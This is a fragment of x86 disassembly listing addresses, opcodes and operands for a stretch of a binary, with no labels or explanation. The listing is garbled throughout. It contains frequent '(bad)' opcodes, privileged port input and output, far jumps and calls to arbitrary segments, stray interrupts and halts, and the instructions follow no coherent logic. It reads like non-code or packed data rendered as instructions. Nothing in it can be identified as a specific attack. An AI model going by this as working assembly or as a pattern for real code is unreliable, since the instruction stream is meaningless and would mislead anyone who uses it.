  412cf9:	jo     0x412cf8
  412cfb:	in     al,0x52
  412cfd:	inc    esp
  412cfe:	pop    ss
  412cff:	daa    
  412d00:	dec    esi
  412d01:	fdivrp st(7),st
  412d03:	mov    bl,0x19
  412d05:	mov    WORD PTR [ebx],?
  412d07:	pop    eax
  412d08:	mov    edi,0xeb94a9c
  412d0d:	sub    DWORD PTR [esi-0x5c],0xffffffd4
  412d11:	adc    ebx,DWORD PTR [edi]
  412d13:	mov    edi,0xf42f301c
  412d18:	sub    bh,BYTE PTR ds:0x8fb65874
  412d1e:	xlat   BYTE PTR ds:[ebx]
  412d1f:	out    0x80,al
  412d21:	jle    0x412d72
  412d23:	dec    eax
  412d24:	mov    ds:0xca6dbe5,eax
  412d29:	(bad)  
  412d2b:	xchg   edx,eax
  412d2c:	mov    ecx,0x750ddf21
  412d31:	pop    esi
  412d32:	fld    QWORD PTR [ebx+eax*2]
  412d35:	sbb    esi,DWORD PTR [edi+0x472ab74]
  412d3b:	xor    bl,BYTE PTR [ebx+0x6beeb9dd]
  412d41:	shl    BYTE PTR [esi-0xe68c99],cl
  412d47:	pop    es
  412d48:	loopne 0x412d6c
  412d4a:	dec    ebp
  412d4b:	out    dx,al
  412d4c:	inc    ebp
  412d4d:	imul   DWORD PTR [eax-0x57ee30e4]
  412d53:	outs   dx,DWORD PTR ds:[esi]
  412d54:	mov    ah,0x47
  412d56:	repnz shl BYTE PTR cs:[ebp+0x61],0xcf
  412d5c:	(bad)  
  412d5d:	jmp    0x41635572
  412d62:	lods   eax,DWORD PTR ds:[esi]
  412d63:	jns    0x412de3
  412d65:	das    
  412d66:	repz dec edx
  412d68:	cmp    BYTE PTR [ebp-0x39],al
  412d6b:	mov    edx,0xdf71b738
  412d70:	hlt    
  412d71:	mov    WORD PTR [eax-0x7eb327ea],fs
  412d77:	int3   
  412d78:	out    0xb6,al
  412d7a:	cmp    BYTE PTR [ecx-0x51],dh
  412d7d:	sub    DWORD PTR [esi+0x7ab01535],ebx
  412d83:	sbb    esi,0x713f98b5
  412d89:	scas   al,BYTE PTR es:[edi]
  412d8a:	jb     0x412ddb
  412d8c:	adc    edx,edx
  412d8e:	jno    0x412d8f
  412d90:	cld    
  412d91:	pop    esi
  412d92:	in     al,0xe6
  412d94:	nop
  412d95:	loope  0x412d8a
  412d97:	loopne 0x412d6f
  412d99:	leave  
  412d9a:	xchg   DWORD PTR [edi+0x61],edx
  412d9d:	pop    ebp
  412d9e:	retf   
  412d9f:	lods   al,BYTE PTR ds:[esi]
  412da1:	dec    esi
  412da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412da3:	fiadd  DWORD PTR [eax-0x40]
  412da6:	mov    eax,ds:0xad92a74
  412dab:	test   BYTE PTR [eax],dl
  412dad:	mov    ds:0x9d39613a,al
  412db2:	adc    al,0x2e
  412db4:	das    
  412db5:	jecxz  0x412de7
  412db7:	in     al,dx
  412db8:	repnz out 0x6,al
  412dbb:	xchg   bl,dl
  412dbd:	pop    eax
  412dbe:	or     al,0x6e
  412dc0:	xchg   ecx,eax
  412dc1:	mov    DWORD PTR [ecx+0x21],0xa3c4521e
  412dc8:	or     dl,BYTE PTR [edi]
  412dca:	outs   dx,BYTE PTR ds:[esi]
  412dcb:	push   ss
  412dcc:	mov    ebp,0x59557dad
  412dd1:	ins    BYTE PTR es:[edi],dx
  412dd2:	mov    bl,0xf2
  412dd4:	stos   DWORD PTR es:[edi],eax
  412dd5:	fadd   st(5),st
  412dd7:	ret    
  412dd8:	rcl    BYTE PTR [ebx+0x34],1
  412ddb:	push   0x63
  412ddd:	ret    0x2b8a
  412de0:	mov    bh,BYTE PTR [eax-0x606fdadd]
  412de6:	inc    ecx
  412de7:	cmp    DWORD PTR [ecx-0x27],0x365dd60c
  412dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412def:	imul   esp,DWORD PTR [edi+0x37],0x5f74dccd
  412df6:	sbb    bl,BYTE PTR [ebx]
  412df8:	lahf   
  412df9:	leave  
  412dfa:	hlt    
  412dfb:	leave  
  412dfc:	repnz pop esp
  412dfe:	repz mov ds:0xc552db83,al
  412e04:	das    
  412e05:	iret   
  412e06:	pop    ss
  412e07:	fstp   TBYTE PTR [esp+edi*8-0x15bcaf30]
  412e0e:	mov    cl,0x4
  412e10:	push   eax
  412e11:	mov    ecx,0x88e6dfa6
  412e16:	xchg   edx,eax
  412e17:	stos   DWORD PTR es:[edi],eax
  412e18:	addr16 mov ah,al
  412e1b:	outs   dx,DWORD PTR ds:[esi]
  412e1c:	jbe    0x412e89
  412e1e:	push   0x2f
  412e20:	aaa    
  412e21:	xor    ebx,DWORD PTR [ecx-0x6b]
  412e24:	ror    edx,1
  412e26:	dec    ecx
  412e27:	jnp    0x412e15
  412e29:	retf   
  412e2a:	jmp    0x9364bc9c
  412e2f:	pop    esp
  412e30:	sub    eax,0x11fa4649
  412e35:	lods   eax,DWORD PTR ds:[esi]
  412e36:	dec    eax
  412e37:	loope  0x412ea2
  412e39:	sub    eax,0xede08133
  412e3e:	popf   
  412e3f:	inc    ebp
  412e40:	sub    edi,ebx
  412e42:	or     BYTE PTR [edx+0xa],0x45
  412e46:	sbb    eax,DWORD PTR [ecx-0x78092bd9]
  412e4c:	add    cl,BYTE PTR [edi+ebx*4-0x50]
  412e50:	in     al,0x23
  412e52:	fmul   QWORD PTR [ebx+esi*4]
  412e55:	cmp    BYTE PTR [esi-0x726984cf],bh
  412e5b:	xchg   ebp,eax
  412e5c:	ret    
  412e5d:	daa    
  412e5e:	cli    
  412e5f:	rcr    eax,cl
  412e61:	mov    WORD PTR ds:0xc6ffa768,ds
  412e67:	mov    edi,0x12bd9207
  412e6c:	cmp    eax,0xc4a133fd
  412e71:	cdq    
  412e72:	mov    ah,dl
  412e74:	nop
  412e75:	jmp    0xda47:0xf90b94df
  412e7c:	jne    0x412ef4
  412e7e:	(bad)  
  412e7f:	sub    BYTE PTR [ebx+0x7ac8d9b0],ch
  412e85:	push   ss
  412e86:	sar    eax,0x36
  412e89:	fsubr  DWORD PTR [edx+0x1f4378a9]
  412e8f:	sar    ecx,1
  412e91:	rcl    DWORD PTR [ebp+0xb41bd93],0xc1
  412e98:	or     BYTE PTR ds:0xa36d1bec,ah
  412e9e:	gs out dx,al
  412ea0:	sbb    DWORD PTR [edi],ecx
  412ea2:	and    al,0x47
  412ea4:	mov    ds:0xfeeee07e,eax
  412ea9:	dec    edi
  412eaa:	popf   
  412eab:	inc    eax
  412eac:	mov    dh,0x35
  412eae:	popa   
  412eaf:	sub    ebx,ebp
  412eb1:	dec    esp
  412eb2:	neg    DWORD PTR [edx]
  412eb4:	sub    BYTE PTR [edx+esi*2],al
  412eb7:	int3   
  412eb8:	mov    gs:0x56fbbbb6,al
  412ebe:	mov    ecx,0x710256a1
  412ec3:	dec    ecx
  412ec4:	aam    0x5
  412ec6:	mov    ds:0x899e468b,eax
  412ecb:	sbb    al,0xea
  412ecd:	std    
  412ece:	jb     0x412eb2
  412ed0:	xor    DWORD PTR [edx],0xc33ca91b
  412ed6:	ss cli 
  412ed8:	sar    ebp,cl
  412eda:	shl    ah,cl
  412edc:	ins    BYTE PTR es:[edi],dx
  412edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ede:	daa    
  412edf:	cs pop ecx
  412ee1:	jle    0x412f03
  412ee3:	retf   0xd14
  412ee6:	imul   ebp,ebp,0xffffffec
  412ee9:	loopne 0x412f69
  412eeb:	fcmovu st,st(5)
  412eed:	mov    dh,0xb5
  412eef:	out    dx,eax
  412ef0:	mov    cl,0xe3
  412ef2:	add    edx,edx
  412ef4:	dec    edx
  412ef5:	push   cs
  412ef6:	mov    bh,0x1b
  412ef8:	jo     0x2f52ef53
  412efe:	ins    BYTE PTR es:[edi],dx
  412eff:	cmc    
  412f00:	iret   
  412f01:	fs loop 0x412f19
  412f04:	fsubr  st,st(6)
  412f06:	mov    esp,0x2f62114f
  412f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f0c:	or     BYTE PTR [ebp+0x7a],dl
  412f0f:	cmp    al,0xe0
  412f11:	mov    edx,cs
  412f13:	or     eax,0xeaed8794
  412f18:	clc    
  412f19:	xor    BYTE PTR [esi+0x5a715a0],0x3b
  412f20:	fucomi st,st(3)
  412f22:	fstp   DWORD PTR ds:0xab14625f
  412f28:	push   ds
  412f29:	xchg   edi,eax
  412f2a:	push   edi
  412f2b:	test   DWORD PTR fs:[esi+0x150cdf7c],esp
  412f32:	es inc eax
  412f34:	push   0x5f
  412f36:	cmp    eax,0x12780973
  412f3b:	xchg   ebx,eax
  412f3c:	sar    DWORD PTR [edx],cl
  412f3e:	adc    al,0xf8
  412f40:	jmp    0x30ac:0x79a8b454
  412f47:	sbb    ch,BYTE PTR [ecx+0x26]
  412f4a:	out    0x24,ax
  412f4d:	test   ch,0xf6
  412f50:	das    
  412f51:	xchg   BYTE PTR [eax-0x41359210],bh
  412f57:	lock out 0xd7,al
  412f5a:	repz int 0x15
  412f5d:	cmp    DWORD PTR [eax+edi*8-0x45725496],0x74c03aaa
  412f68:	cmp    eax,0x6741e941
  412f6d:	mov    ebx,0x30dd5e43
  412f72:	xor    al,0x9c
  412f74:	jle    0x412f2f
  412f76:	mov    ebp,0xd7ad65a4
  412f7b:	es cld 
  412f7d:	jp     0x412f18
  412f7f:	or     BYTE PTR [edi+0x1bfaf691],al
  412f85:	into   
  412f86:	xor    eax,0x7196306
  412f8b:	pusha  
  412f8c:	add    BYTE PTR [ecx],bh
  412f8e:	enter  0x8906,0x9d
  412f92:	xor    al,0xbe
  412f94:	dec    esi
  412f95:	fwait
  412f96:	cli    
  412f97:	mov    al,ds:0x67797801
  412f9c:	int    0xa6
  412f9e:	mov    al,0x26
  412fa0:	mov    dl,0xbc
  412fa2:	jb     0x412ffb
  412fa4:	sub    BYTE PTR [eax],cl
  412fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fa7:	ins    BYTE PTR es:[edi],dx
  412fa8:	enter  0x957a,0x9b
  412fac:	sbb    DWORD PTR [ebx+0x5d],edi
  412faf:	lock push es
  412fb1:	shr    DWORD PTR [edi-0x60803e97],1
  412fb7:	arpl   WORD PTR [edi],sp
  412fb9:	(bad)  
  412fba:	jmp    0xc9e3:0x5defd458
  412fc1:	outs   dx,BYTE PTR ds:[esi]
  412fc2:	inc    ebp
  412fc3:	ret    0xa1f5
  412fc6:	inc    esp
  412fc7:	inc    esi
  412fc8:	jmp    0x49bf:0x90f2976d
  412fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fd0:	cmp    DWORD PTR [ecx],ebp
  412fd2:	mov    DWORD PTR [esi],ebp
  412fd4:	dec    edx
  412fd5:	push   DWORD PTR [eax]
  412fd7:	(bad)  
  412fd8:	jbe    0x412faf
  412fda:	xchg   ebp,eax
  412fdb:	xor    ebx,DWORD PTR [ecx-0x50]
  412fde:	adc    cl,BYTE PTR [ecx+0x38e21d6c]
  412fe4:	idiv   BYTE PTR [ebp+0x41acda91]
  412fea:	call   0xfa1d4412
  412fef:	xchg   ecx,eax
  412ff0:	sub    BYTE PTR [eax-0x65],al
  412ff3:	xchg   ebp,eax
  412ff4:	mov    bh,0x9a
  412ff6:	mov    BYTE PTR [ecx-0xc],dl
  412ff9:	mov    esi,0x369e5aab
  412ffe:	shr    DWORD PTR [esi+0x3f],1
  413001:	or     ah,cl
  413003:	xor    BYTE PTR ds:0xa5480726,ch
  413009:	cmc    
  41300a:	ret    0x8ed3
  41300d:	pushf  
  41300e:	sti    
  41300f:	jge    0x41304d
  413011:	pop    ds
  413012:	push   esp
  413013:	inc    edx
  413014:	dec    edx
  413015:	ficom  WORD PTR [edx]
  413017:	in     al,0xc2
  413019:	mov    eax,0x670c0397
  41301e:	cmp    al,BYTE PTR [edx-0x7870762d]
  413024:	outs   dx,BYTE PTR ds:[esi]
  413025:	stos   BYTE PTR es:[edi],al
  413026:	jl     0x41306b
  413028:	ror    DWORD PTR [edi+eiz*1+0x52631897],1
  41302f:	popf   
  413030:	adc    dl,BYTE PTR [edi]
  413032:	aam    0x3a
  413034:	(bad)  
  413035:	call   FWORD PTR [eax-0x34a186b8]
  41303b:	or     ah,BYTE PTR [ecx+0x767c1b6f]
  413041:	pop    esi
  413042:	and    al,0xfc
  413044:	imul   edi,eax,0xffffffce
  413047:	sub    al,0x8f
  413049:	and    ebp,DWORD PTR [edx]
  41304b:	ins    BYTE PTR es:[edi],dx
  41304c:	inc    ecx
  41304d:	in     eax,0x66
  41304f:	popf   
  413050:	in     al,0xbe
  413052:	call   DWORD PTR [edi+ecx*1]
  413055:	xchg   esi,eax
  413056:	je     0x41309e
  413058:	adc    BYTE PTR [eax+0x1c01ce80],0x44
  41305f:	out    dx,eax
  413060:	ret    0x804
  413063:	xor    DWORD PTR [edi+0x2],esi
  413066:	popf   
  413067:	jbe    0x4130c1
  413069:	jecxz  0x413016
  41306b:	adc    ecx,DWORD PTR [ecx+edi*2]
  41306e:	(bad)  
  41306f:	pop    esi
  413070:	inc    esp
  413071:	ds jmp 0x41309f
  413074:	mov    al,ds:0xa26e3280
  413079:	add    BYTE PTR [ebp+edx*4+0x2d],ah
  41307d:	jp     0x4130c6
  41307f:	pop    ss
  413080:	or     al,0x72
  413082:	int    0xb7
  413084:	fsubp  st(0),st
  413086:	push   ebp
  413087:	fsubr  DWORD PTR [edi+0x51bf81c8]
  41308d:	inc    ebx
  41308e:	or     eax,0x1e121a16
  413093:	jnp    0x4130f7
  413095:	cdq    
  413096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413097:	(bad)  
  413098:	retf   0xd023
  41309b:	(bad)  
  41309c:	push   0x53
  41309e:	dec    eax
  41309f:	out    dx,eax
  4130a0:	jmp    0x413025
  4130a2:	push   esp
  4130a3:	sub    cl,ah
  4130a5:	adc    al,0x39
  4130a7:	mov    esi,0x51cb5a1
  4130ac:	loop   0x41311f
  4130ae:	adc    al,0xfb
  4130b0:	mov    dh,0x71
  4130b2:	inc    edi
  4130b3:	xor    al,0x4c
  4130b5:	push   0xffffff82
  4130b7:	cld    
  4130b8:	and    DWORD PTR [edi],esp
  4130ba:	stos   BYTE PTR es:[edi],al
  4130bb:	push   ebx
  4130bc:	mov    BYTE PTR ss:[ebp+0x62],bh
  4130c0:	or     eax,0xef72d8a6
  4130c5:	sbb    eax,0x23a8cd8c
  4130ca:	in     al,dx
  4130cb:	jge    0x4130ff
  4130cd:	mov    ds:0xec19a891,al
  4130d2:	push   eax
  4130d3:	mov    bh,0x3b
  4130d5:	and    eax,0x8950f0f8
  4130da:	add    DWORD PTR [ebx],esp
  4130dc:	and    BYTE PTR [esp+ebx*4],dh
  4130df:	pop    ecx
  4130e0:	scas   al,BYTE PTR es:[edi]
  4130e1:	imul   DWORD PTR [ebp-0x1c8dd19]
  4130e7:	loop   0x41311d
  4130e9:	dec    esp
  4130ea:	cmp    eax,0x17843511
  4130ef:	adc    esi,DWORD PTR [ebx+0x794c8623]
  4130f5:	lea    ebx,[edx-0x560b8c19]
  4130fb:	aas    
  4130fc:	and    eax,0xa7588cb1
  413101:	ret    
  413102:	xor    al,0xbf
  413104:	lods   al,BYTE PTR ds:[esi]
  413105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413106:	add    dl,cl
  413108:	mov    DWORD PTR [edx],ebx
  41310a:	lahf   
  41310b:	xchg   al,cl
  41310d:	pop    ecx
  41310e:	pop    ds
  41310f:	pop    ebx
  413110:	xchg   edi,eax
  413111:	push   ds
  413112:	rcr    DWORD PTR [ebx],0x9b
  413115:	mov    dh,0xab
  413117:	iret   
  413118:	or     al,0xbf
  41311a:	neg    ah
  41311c:	push   ds
  41311d:	ja     0x41319b
  41311f:	inc    edi
  413120:	sbb    DWORD PTR [esp+eax*4+0xd],ebp
  413124:	out    dx,eax
  413125:	sub    ecx,esi
  413127:	(bad)  
  413129:	mov    esi,0xf87a1ff1
  41312e:	push   ebp
  41312f:	dec    esp
  413130:	(bad)  
  413131:	cld    
  413132:	stc    
  413133:	push   cs
  413134:	mov    ch,0x4a
  413136:	mov    ds:0xd3fbbce6,eax
  41313b:	out    dx,eax
  41313c:	adc    eax,0xe52c6ca5
  413141:	and    dl,BYTE PTR [edx-0x7c]
  413144:	and    ch,BYTE PTR [eax]
  413146:	mov    ecx,0xd2a41aa7
  41314b:	out    dx,al
  41314c:	jg     0x4131bd
  41314e:	pop    esi
  41314f:	pushf  
  413150:	mov    al,ds:0xa98781a0
  413155:	imul   esi,eax,0x1af9b6cf
  41315b:	aaa    
  41315c:	jns    0x4131c3
  41315e:	fist   DWORD PTR [eax-0x62131a13]
  413164:	mov    ch,0x4b
  413166:	sub    BYTE PTR [edx-0x8fe6aca],cl
  41316c:	mov    DWORD PTR [edx],edx
  41316e:	frstor [ebx+esi*1+0x1cf7d92f]
  413175:	faddp  st(4),st
  413177:	cli    
  413178:	fnstenv [edx-0x14bd375b]
  41317e:	(bad)  
  41317f:	adc    al,0xdf
  413181:	icebp  
  413182:	and    al,0x2
  413184:	and    eax,0x2732c446
  413189:	xor    al,0xd5
  41318b:	inc    esp
  41318c:	shl    ecx,cl
  41318e:	or     eax,0xd7f6dfe4
  413193:	fs popa 
  413195:	dec    ebp
  413196:	push   ebp
  413197:	jae    0x413205
  413199:	stos   BYTE PTR es:[edi],al
  41319a:	jmp    0x5bb9:0xe9320486
  4131a1:	popa   
  4131a2:	lea    ecx,[ecx+0x5a]
  4131a5:	mov    bl,0xf3
  4131a7:	sbb    eax,0x8ece37d7
  4131ac:	or     ecx,eax
  4131ae:	rcr    eax,cl
  4131b0:	sbb    cl,0x66
  4131b3:	fcmovnbe st,st(5)
  4131b5:	add    edx,DWORD PTR [esi-0x7]
  4131b8:	sub    DWORD PTR [ebp+0x7d26b00f],eax
  4131be:	adc    ah,0x82
  4131c1:	push   es
  4131c2:	adc    ebx,DWORD PTR [edx+ebx*2+0x16585395]
  4131c9:	mov    cl,0xb2
  4131cb:	mov    ch,0x17
  4131cd:	sub    ecx,DWORD PTR [edi+0x543ae88b]
  4131d3:	mov    dl,0x3d
  4131d5:	sub    edx,DWORD PTR [ecx+0x73]
  4131d8:	push   edi
  4131d9:	sbb    bh,BYTE PTR [ecx-0x80]
  4131dc:	pop    ebx
  4131dd:	out    0x6c,eax
  4131df:	(bad)  
  4131e0:	daa    
  4131e1:	xchg   ecx,eax
  4131e2:	sub    al,0xb2
  4131e4:	out    dx,eax
  4131e5:	xchg   edi,eax
  4131e6:	into   
  4131e7:	call   0xf8a9eac9
  4131ec:	fidivr DWORD PTR [edi-0x2237e222]
  4131f2:	das    
  4131f3:	inc    ebx
  4131f4:	test   eax,0xb7181711
  4131f9:	add    dh,BYTE PTR ds:0x169f05f2
  4131ff:	push   ss
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413202:	jo     0x413282
  413204:	mov    eax,0xa084a76d
  413209:	int3   
  41320a:	pusha  
  41320b:	inc    esi
  41320c:	push   edx
  41320d:	inc    ebx
  41320e:	hlt    
  41320f:	rcl    BYTE PTR [ebp+0x1f],cl
  413212:	adc    edi,DWORD PTR [eax+0x48]
  413215:	sbb    eax,0xf41a552a
  41321a:	xchg   DWORD PTR [esp+eax*2-0x35958e04],esp
  413221:	xchg   esp,eax
  413222:	aad    0x65
  413224:	lea    edi,[esi]
  413226:	cmp    BYTE PTR [edi],ah
  413228:	dec    eax
  413229:	cmp    DWORD PTR [ebx+0x32],edi
  41322c:	add    eax,0x6db04fc8
  413231:	xor    al,0x1b
  413233:	ins    BYTE PTR es:[edi],dx
  413234:	ret    
  413235:	fild   WORD PTR [edx]
  413237:	(bad)  
  413238:	xor    eax,0xd8efb1dd
  41323d:	inc    eax
  41323e:	mov    esi,0xc17b46d9
  413243:	imul   ecx,DWORD PTR [edx+0x51],0x51
  413247:	mov    WORD PTR [edi-0x65],?
  41324a:	out    dx,eax
  41324b:	(bad)  
  41324c:	cld    
  41324d:	mov    ebx,0x1020722a
  413252:	inc    esp
  413253:	mov    ecx,0x5419576
  413258:	pop    es
  413259:	outs   dx,DWORD PTR ds:[esi]
  41325a:	and    DWORD PTR [esp+ecx*8+0x34],ebx
  41325e:	ins    BYTE PTR es:[edi],dx
  41325f:	mov    ah,0x61
  413261:	in     al,dx
  413262:	mov    bl,0x3
  413264:	sub    BYTE PTR [eax-0x7a],ch
  413267:	out    0x69,eax
  413269:	scas   eax,DWORD PTR es:[edi]
  41326a:	or     al,0x5a
  41326c:	sti    
  41326d:	int    0xa9
  41326f:	outs   dx,DWORD PTR ds:[esi]
  413270:	or     eax,0x2800e9be
  413275:	add    ebx,ebx
  413277:	adc    al,BYTE PTR [esp+edi*1+0x3d]
  41327b:	fist   DWORD PTR [edi]
  41327d:	mov    ds:0xec1d5ba1,al
  413282:	jbe    0x4132f5
  413284:	dec    eax
  413285:	mov    dl,0x2a
  413287:	scas   al,BYTE PTR es:[edi]
  413288:	xchg   ecx,eax
  413289:	ss add al,0x6
  41328c:	xchg   BYTE PTR [ebp-0x76018c26],dl
  413292:	dec    ebx
  413293:	call   0xcbb3:0x41dce866
  41329a:	push   esi
  41329b:	ret    
  41329c:	in     al,dx
  41329d:	mov    bh,0x81
  41329f:	pop    edi
  4132a0:	int    0x61
  4132a2:	lock push es
  4132a4:	fcomp  QWORD PTR [edi]
  4132a6:	push   eax
  4132a7:	and    eax,0x2f06b7ab
  4132ac:	sub    eax,DWORD PTR [esi-0x15a325e2]
  4132b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132b3:	or     BYTE PTR [esp+edx*2-0x67],dl
  4132b7:	popa   
  4132b8:	sbb    al,0x6b
  4132ba:	mov    dl,0xc4
  4132bc:	pop    esi
  4132bd:	je     0x4132a8
  4132bf:	mov    esp,0x1f47d2d2
  4132c4:	rol    BYTE PTR [eax-0xe],0x61
  4132c8:	jno    0x4132cc
  4132ca:	(bad)  
  4132cb:	arpl   WORD PTR [esp+ebp*1],di
  4132ce:	add    al,0xb0
  4132d0:	ret    0x1751
  4132d3:	out    dx,eax
  4132d4:	xor    BYTE PTR [ecx+ebp*2+0x4cd2369c],cl
  4132db:	imul   ecx,DWORD PTR [ebx+eiz*1-0x17],0x7c1225b1
  4132e3:	fucomp st(7)
  4132e5:	push   eax
  4132e6:	xchg   ecx,eax
  4132e7:	mov    ch,BYTE PTR [ecx]
  4132e9:	cs lahf 
  4132eb:	and    DWORD PTR [ebp-0x4e498638],0x859b66dc
  4132f5:	mov    esi,ebp
  4132f7:	jl     0x413313
  4132f9:	jmp    0x746d:0xebfd9b10
  413300:	and    edi,DWORD PTR [ebp+0x0]
  413303:	lods   al,BYTE PTR ds:[esi]
  413304:	sub    DWORD PTR [ebp+0x2bb0cdf7],esp
  41330a:	push   esi
  41330b:	mov    al,0xad
  41330d:	dec    ebx
  41330e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41330f:	push   eax
  413310:	dec    esi
  413311:	dec    ebp
  413312:	mov    ecx,0xb37f3652
  413317:	test   BYTE PTR [eax],al
  413319:	fdiv   DWORD PTR [esp+edx*4+0x6c]
  41331d:	test   BYTE PTR [edx-0xf],ah
  413320:	add    esp,ebx
  413322:	add    dh,bh
  413324:	aaa    
  413325:	or     DWORD PTR [ebp+edx*2+0x55],0xf291d7a8
  41332d:	imul   eax,DWORD PTR ds:[eax],0xffffff93
  413331:	mov    al,0xe3
  413333:	push   edx
  413334:	cmp    ah,BYTE PTR [edx+0x11]
  413337:	cmp    DWORD PTR [edi],ebx
  413339:	es cmp edx,esp
  41333c:	clc    
  41333d:	or     ebp,esp
  41333f:	(bad)  
  413340:	xchg   ecx,eax
  413341:	mov    ch,0xfb
  413343:	repz iret 
  413345:	mov    dh,0x3c
  413347:	add    edx,DWORD PTR [esi+0x7c]
  41334a:	int3   
  41334b:	pop    ebx
  41334c:	ror    DWORD PTR [ecx-0x17b8625],cl
  413352:	icebp  
  413353:	call   0x4e8:0x66360ffa
  41335a:	int3   
  41335b:	neg    DWORD PTR [edx+0x30bef709]
  413361:	dec    ecx
  413362:	push   eax
  413363:	dec    ecx
  413364:	adc    ch,dh
  413366:	es push edi
  413368:	pop    ebp
  413369:	in     al,0x1f
  41336b:	inc    eax
  41336c:	imul   ebx,DWORD PTR [ebx],0x5d
  41336f:	imul   edi,DWORD PTR [esp+edi*1],0x79
  413373:	jp     0x413391
  413375:	aaa    
  413376:	lock sub al,cl
  413379:	call   0x59341748
  41337e:	xchg   edi,eax
  41337f:	xchg   edi,eax
  413380:	rol    DWORD PTR [eax],cl
  413382:	dec    edi
  413383:	sbb    BYTE PTR [ecx],dl
  413385:	mov    bl,0xed
  413387:	push   edx
  413388:	cmc    
  413389:	add    ebp,DWORD PTR [edi+0x38]
  41338c:	cmp    bl,BYTE PTR [esi]
  41338e:	stos   DWORD PTR es:[edi],eax
  41338f:	push   esp
  413390:	repnz lock fsubr DWORD PTR [esi+0x47]
  413395:	xor    esp,DWORD PTR [ecx-0x34]
  413398:	mov    al,ds:0x7e951f38
  41339d:	fst    QWORD PTR [ebp+0x201f1f4d]
  4133a3:	in     eax,0x8d
  4133a5:	js     0x413398
  4133a7:	popf   
  4133a8:	lods   eax,DWORD PTR ds:[esi]
  4133a9:	jle    0x413389
  4133ab:	jg     0x413393
  4133ad:	leave  
  4133ae:	or     eax,0xe1dd5394
  4133b3:	push   esp
  4133b4:	mov    ebp,0xa596b328
  4133b9:	inc    esi
  4133ba:	jnp    0x413390
  4133bc:	pop    ebx
  4133bd:	icebp  
  4133be:	cmc    
  4133bf:	fs xchg edi,eax
  4133c1:	cmp    eax,0x6db6bf62
  4133c6:	pop    esi
  4133c7:	push   esi
  4133c8:	jne    0x4133b8
  4133ca:	sub    edi,DWORD PTR [ebx]
  4133cc:	jmp    0xd6fa:0x778bfb26
  4133d3:	test   eax,0x8af0bda2
  4133d8:	pop    ebx
  4133d9:	lea    esp,[ebp-0x66]
  4133dc:	jl     0x413377
  4133de:	xor    al,0x6e
  4133e1:	cld    
  4133e2:	test   eax,0x995f0ee9
  4133e7:	inc    BYTE PTR [edx]
  4133e9:	inc    edx
  4133ea:	mov    al,0xd6
  4133ec:	fmul   st,st(2)
  4133ee:	popf   
  4133ef:	or     edx,0x68
  4133f2:	mov    bl,0xb2
  4133f4:	out    0xdc,al
  4133f6:	cmp    al,0x3d
  4133f8:	jo     0x4133cc
  4133fa:	push   cs
  4133fb:	stc    
  4133fc:	push   ecx
  4133fd:	in     eax,0xcc
  4133ff:	dec    edi
  413400:	(bad)  
  413401:	push   ss
  413402:	xchg   esi,eax
  413403:	test   al,0x63
  413405:	cdq    
  413406:	xchg   ecx,eax
  413407:	add    BYTE PTR [edx+0x65],bl
  41340a:	jno    0x41345f
  41340c:	fistp  DWORD PTR [ebx+0x7a]
  41340f:	ficom  DWORD PTR [ebx-0x6f75e2d6]
  413415:	dec    esi
  413416:	cmp    eax,0x2db795c7
  41341b:	in     al,dx
  41341c:	inc    eax
  41341d:	int3   
  41341e:	xlat   BYTE PTR ds:[ebx]
  41341f:	jmp    0x41341f
  413421:	pop    eax
  413422:	hlt    
  413423:	loop   0x4133e9
  413425:	inc    ecx
  413426:	mov    al,0xee
  413428:	hlt    
  413429:	sub    eax,0x18ab2a1f
  41342e:	xchg   ch,bl
  413430:	out    0x8,eax
  413432:	sub    esi,DWORD PTR [ebx+0x4ec04a0a]
  413438:	sti    
  413439:	jo     0x4133c7
  41343b:	ficom  WORD PTR [ebx]
  41343d:	mov    eax,ds:0xc279a926
  413442:	test   al,0x67
  413444:	into   
  413445:	push   ds
  413446:	nop
  413447:	je     0x413426
  413449:	and    bh,BYTE PTR [esi+0x6c]
  41344c:	inc    esi
  41344d:	mov    eax,0x955cc5d4
  413452:	mov    ebx,0x8c8bfa96
  413457:	xchg   edi,eax
  413458:	popa   
  413459:	mov    cl,0xe2
  41345b:	out    0x1e,al
  41345d:	call   0x4c3f:0x34ac030a
  413464:	push   0x84f9195d
  413469:	xchg   edx,eax
  41346a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41346b:	xor    eax,0x37077197
  413470:	dec    esi
  413471:	das    
  413472:	pusha  
  413473:	mov    bl,0xde
  413475:	sbb    ecx,DWORD PTR [edi+0x5afcc23c]
  41347b:	inc    ebx
  41347c:	fidivr WORD PTR [ecx]
  41347e:	test   BYTE PTR [edx],ah
  413480:	mov    al,0x52
  413482:	fsubr  st,st(5)
  413484:	or     DWORD PTR [eax-0x13b19279],0x109e7960
  41348e:	ins    DWORD PTR es:[edi],dx
  41348f:	push   eax
  413490:	arpl   WORD PTR [edx-0x5bdd5c17],bp
  413496:	daa    
  413497:	inc    edx
  413498:	mov    bh,0x8
  41349a:	sub    al,0x3f
  41349c:	push   0xffffffb8
  41349e:	mov    WORD PTR [eax+edi*2],?
  4134a1:	xor    eax,0x90c69592
  4134a6:	xor    al,0xce
  4134a8:	imul   DWORD PTR [ebx]
  4134aa:	dec    ecx
  4134ab:	inc    eax
  4134ac:	lea    edi,[eax+0x39a0fb34]
  4134b2:	pop    edi
  4134b3:	sub    al,0xec
  4134b5:	shl    edi,cl
  4134b7:	and    ecx,0xffffff82
  4134ba:	lods   eax,DWORD PTR ds:[esi]
  4134bb:	add    ah,BYTE PTR [eax-0x6b2bc5d9]
  4134c1:	test   al,0x2e
  4134c3:	inc    ecx
  4134c4:	imul   edi,esi,0x23
  4134c7:	fmul   QWORD PTR [edx+0x43]
  4134ca:	nop
  4134cb:	mov    edi,0x88a8598e
  4134d0:	and    al,0xf5
